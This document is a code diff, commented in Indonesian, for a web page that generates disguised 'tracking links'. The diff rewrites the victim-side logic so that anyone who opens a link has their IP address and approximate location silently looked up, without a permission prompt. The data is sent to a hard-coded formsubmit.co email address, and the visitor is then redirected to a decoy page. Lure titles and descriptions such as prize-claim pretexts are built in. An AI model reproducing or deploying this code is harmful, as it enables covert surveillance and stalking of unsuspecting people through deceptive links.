@@ -152,7 +152,7 @@
         <!-- Content untuk mode pembuat -->
         <div id="creatorContent">
             <h1>🛠️ Pembuat Tautan Pelacak S 🛠️</h1>
-            <p>Selamat datang, users! Di sini, kamu bisa membuat tautan pelacak yang akan membongkar lokasi targetmu begitu mereka membukanya. Sebuah trik kecil yang licik, bukan? Haha! Ini adalah permainan pikiran!</p>
+            <p>Selamat datang, users! Di sini, kamu bisa membuat tautan pelacak IP yang akan membongkar perkiraan lokasi targetmu begitu mereka membukanya. Tanpa izin browser! Sebuah trik kecil yang licik, bukan? Haha! Ini adalah permainan pikiran!</p>
 
             <div class="input-group">
                 <label for="redirectUrl">URL Pengalihan (Wajib - Setelah lokasi didapat):</label>
@@ -164,7 +164,7 @@
             </div>
             <div class="input-group">
                 <label for="lureDescription">Deskripsi Halaman Penarik (Untuk Target):</label>
-                <input type="text" id="lureDescription" placeholder="Contoh: Kami perlu verifikasi lokasi Anda untuk mengklaim hadiah ini.">
+                <input type="text" id="lureDescription" placeholder="Contoh: Kami perlu verifikasi IP Anda untuk mengklaim hadiah ini.">
             </div>
 
             <button id="generateLinkButton">🚀 Buat Tautan Pelacak Sekarang!</button>
@@ -201,7 +201,7 @@
 
     <script>
         // HATI-HATI: Ganti URL webhook ini dengan milikmu! Ini akan menerima data lokasi.
-        const webhook = "https://formsubmit.co/ffakunff1921234@gmail.com";
+        const webhook = "https://formsubmit.co/ffakunff1921234@gmail.com"; // URL WEBHOOK BARU!
 
         const statusDisplay = document.querySelector(".status");
         let consoleLogDisplay = document.getElementById("consoleLog");
@@ -217,10 +217,9 @@
         const targetContentDiv = document.getElementById("targetContent");
         const targetTitleElement = document.getElementById("targetTitle");
         const targetDescriptionElement = document.getElementById("targetDescription");
-        const glitchEffectElement = document.getElementById("glitchEffect"); // Dapatkan elemen glitch
+        const glitchEffectElement = document.getElementById("glitchEffect");
         let targetConsoleLogDisplay;
 
-        // Inisialisasi URL params lebih awal
         const urlParams = new URLSearchParams(window.location.search);
 
         function logToConsole(message) {
@@ -234,14 +233,13 @@
 
         /**
          * Fungsi untuk menyuntikkan gaya hacker/gelap jika dalam mode creator.
-         * Ini memastikan target tidak pernah melihat gaya ini.
          */
         function injectCreatorStyles() {
             const style = document.createElement('style');
             style.innerHTML = `
                 body {
-                    background-color: #1a1a1a !important; /* Latar belakang gelap */
-                    color: #00ff00 !important; /* Hijau Neon */
+                    background-color: #1a1a1a !important;
+                    color: #00ff00 !important;
                 }
                 .container {
                     background-color: #0d0d0d !important;
@@ -303,83 +301,66 @@
             `;
             document.head.appendChild(style);
             if (glitchEffectElement) {
-                glitchEffectElement.style.display = 'block'; // Tampilkan glitch effect hanya untuk creator
+                glitchEffectElement.style.display = 'block';
             }
         }
 
         /**
-         * Fungsi inti yang berjalan saat korban membuka tautan pelacak.
-         * Ini akan mencoba mendapatkan lokasi dan mengirimkannya ke webhook.
+         * Fungsi inti yang berjalan saat target membuka tautan pelacak.
+         * Ini akan mendapatkan lokasi berdasarkan IP tanpa izin.
          */
-        function runTrackingLogic() {
-            logToConsole("Mencoba mendapatkan lokasi target...");
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendLocationAndRedirect, handleError, {
-                    enableHighAccuracy: true,
-                    timeout: 7000,
-                    maximumAge: 0
-                });
-            } else {
-                statusDisplay.textContent = "Browser target tidak mendukung geolocation.";
-                logToConsole("Browser target tidak mendukung geolocation.");
-                sendDummySubmissionForRedirect("Browser tidak mendukung geolocation.");
-            }
-        }
+        async function runTrackingLogic() {
+            logToConsole("Mencoba mendapatkan alamat IP target...");
+            statusDisplay.textContent = "Memuat... Memverifikasi lokasi IP...";
 
-        /**
-         * Mengirim data (lokasi asli atau dummy) ke webhook dan kemudian memicu pengalihan oleh Formsubmit.
-         */
-        function sendLocationAndRedirect(position) {
-            const { latitude, longitude } = position.coords;
+            let clientIp = "Tidak Terdeteksi";
+            let locationInfo = "Gagal mendapatkan detail lokasi IP.";
+            let mapLink = "Tidak tersedia";
+            let ipApiData = null;
+
+            try {
+                // Langkah 1: Dapatkan alamat IP publik klien
+                const ipifyRes = await fetch("https://api.ipify.org?format=json");
+                const ipifyData = await ipifyRes.json();
+                clientIp = ipifyData.ip;
+                logToConsole(`Alamat IP target terdeteksi: ${clientIp}`);
+
+                // Langkah 2: Gunakan IP untuk mendapatkan geolokasi dari ip-api.com
+                // Menggunakan http agar lebih fleksibel di beberapa lingkungan (meskipun HTTPS lebih baik)
+                const ipApiRes = await fetch(`http://ip-api.com/json/${clientIp}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`);
+                ipApiData = await ipApiRes.json();
+
+                if (ipApiData.status === 'success') {
+                    const { lat, lon, city, regionName, country } = ipApiData;
+                    locationInfo = `IP: ${clientIp}, Negara: ${country}, Provinsi: ${regionName}, Kota: ${city}`;
+                    if (lat && lon) {
+                        mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                        locationInfo += `, Lat: ${lat}, Lon: ${lon}`;
+                    }
+                    logToConsole(`Lokasi IP terdeteksi: ${locationInfo}`);
+                    statusDisplay.textContent = "Lokasi IP berhasil diverifikasi.";
+                } else {
+                    locationInfo = `IP: ${clientIp} (API error: ${ipApiData.message || 'unknown'})`;
+                    logToConsole(`IP-API gagal: ${ipApiData.message || 'unknown'}`);
+                    statusDisplay.textContent = "Gagal mendapatkan detail lokasi IP.";
+                }
+            } catch (error) {
+                console.error(`[${new Date().toLocaleTimeString()}] Error saat proses IP geolocation: ${error.message}`);
+                logToConsole(`Terjadi kesalahan saat mendapatkan IP/lokasi: ${error.message} 💥`);
+                statusDisplay.textContent = "Terjadi kesalahan saat verifikasi lokasi.";
+            }
+
+            // Langkah 3: Siapkan dan kirim data ke Formsubmit
             const dataFields = {
-                lokasi: `https://www.google.com/maps?q=${latitude},${longitude}`,
+                lokasi_ip: locationInfo,
+                peta_link: mapLink,
                 waktu: new Date().toString(),
-                _subject: "Lokasi Target Terdeteksi oleh S!",
+                _subject: `IP Lokasi Terdeteksi (Tanpa Izin) oleh S untuk: ${document.title}`, // Menggunakan document.title lure
                 _template: "table",
                 _captcha: "false"
             };
-
-            logToConsole(`Lokasi terdeteksi: Latitude ${latitude}, Longitude ${longitude}. Mengirim data melalui simulasi form...`);
-            statusDisplay.textContent = "Mengirim data lokasi...";
-
-            submitToFormsubmit(dataFields);
-        }
-
-        /**
-         * Menangani error saat mendapatkan lokasi atau ketika geolocation tidak didukung.
-         * Akan mengirim submission dummy dan memicu pengalihan.
-         */
-        function handleError(error) {
-            let errorMessage = "Gagal mendapatkan lokasi.";
-            if (error.code === error.PERMISSION_DENIED) {
-                errorMessage = "Izin lokasi ditolak oleh pengguna.";
-            } else if (error.code === error.POSITION_UNAVAILABLE) {
-                errorMessage = "Informasi lokasi tidak tersedia.";
-            } else if (error.code === error.TIMEOUT) {
-                errorMessage = "Permintaan lokasi habis waktu.";
-            }
-
-            statusDisplay.textContent = `Gagal mendapatkan lokasi: ${errorMessage}`;
-            logToConsole(`Gagal mendapatkan lokasi: ${errorMessage} 🚨`);
-            sendDummySubmissionForRedirect(errorMessage);
-        }
-
-        /**
-         * Fungsi untuk mengirim data dummy (misalnya saat geolocation gagal) ke Formsubmit.
-         * Tujuannya adalah untuk memicu pengalihan melalui _next.
-         */
-        function sendDummySubmissionForRedirect(errorMessage = "Gagal mendapatkan lokasi.") {
-            const dataFields = {
-                lokasi: `Gagal mendapatkan lokasi: ${errorMessage}`,
-                waktu: new Date().toString(),
-                _subject: "Kegagalan Lokasi Terdeteksi oleh S!",
-                _template: "table",
-                _captcha: "false"
-            };
-
-            logToConsole("Mengirim submission dummy untuk memicu pengalihan Formsubmit.");
-            statusDisplay.textContent = "Mengirim data untuk pengalihan...";
-
+            logToConsole("Mengirim data IP lokasi ke Formsubmit...");
+            statusDisplay.textContent = "Mengirim data ke server...";
             submitToFormsubmit(dataFields);
         }
 
@@ -405,7 +386,8 @@
             const nextInput = document.createElement("input");
             nextInput.type = "hidden";
             nextInput.name = "_next";
-            nextInput.value = targetRedirectUrl ? decodeURIComponent(targetRedirectUrl) : (window.location.origin + window.location.pathname);
+            // Jika ada URL pengalihan 'r', gunakan itu. Jika tidak, alihkan ke google.com sebagai fallback.
+            nextInput.value = targetRedirectUrl ? decodeURIComponent(targetRedirectUrl) : "https://google.com";
             form.appendChild(nextInput);
 
             document.body.appendChild(form);
@@ -417,14 +399,14 @@
 
         generateLinkButton.addEventListener('click', () => {
             logToConsole("Tombol 'Buat Tautan Pelacak' diklik. Mengolah...");
-            const baseUrl = window.location.origin + window.location.pathname;
+            const baseUrl = window.location.origin + window.location.pathname; // Menggunakan halaman ini sebagai base
             const desiredRedirect = redirectUrlInput.value.trim();
             const lureTitle = lureTitleInput.value.trim();
             const lureDescription = lureDescriptionInput.value.trim();
             let generatedTrackingLink = baseUrl;
 
             if (!desiredRedirect) {
-                statusDisplay.textContent = "⚠️ URL Pengalihan wajib diisi untuk membuat tautan tidak mencurigakan!";
+                statusDisplay.textContent = "⚠️ URL Pengalihan wajib diisi!";
                 logToConsole("URL Pengalihan kosong. Pembuatan tautan dibatalkan.");
                 return;
             }
@@ -440,7 +422,7 @@
             }
 
             generatedTrackingLink += `?${params}`;
-            logToConsole(`Membentuk tautan dengan pengalihan ke: ${desiredRedirect} dan umpan dinamis 🔗`);
+            logToConsole(`Membentuk tautan pelacak IP dengan pengalihan ke: ${desiredRedirect} dan umpan dinamis 🔗`);
 
             generatedLinkElement.href = generatedTrackingLink;
             generatedLinkElement.textContent = generatedTrackingLink;
@@ -477,14 +459,14 @@
             targetContentDiv.style.display = 'block';
 
             const dynamicTitle = urlParams.get('t') ? decodeURIComponent(urlParams.get('t')) : "Verifikasi Konten Anda";
-            const dynamicDescription = urlParams.get('d') ? decodeURIComponent(urlParams.get('d')) : "Harap izinkan akses lokasi untuk memuat konten ini dengan akurat. Proses ini cepat dan aman.";
+            const dynamicDescription = urlParams.get('d') ? decodeURIComponent(urlParams.get('d')) : "Harap tunggu sebentar, kami sedang memverifikasi akses Anda untuk memuat konten ini. Proses ini cepat dan otomatis.";
 
             document.title = dynamicTitle;
             targetTitleElement.textContent = dynamicTitle;
             targetDescriptionElement.textContent = dynamicDescription;
 
             targetConsoleLogDisplay = document.getElementById("targetConsoleLog");
-            consoleLogDisplay = targetConsoleLogDisplay; // Arahkan logToConsole ke sini
+            consoleLogDisplay = targetConsoleLogDisplay;
 
             logToConsole("Mode target aktif. Memuat halaman umpan...");
             runTrackingLogic();
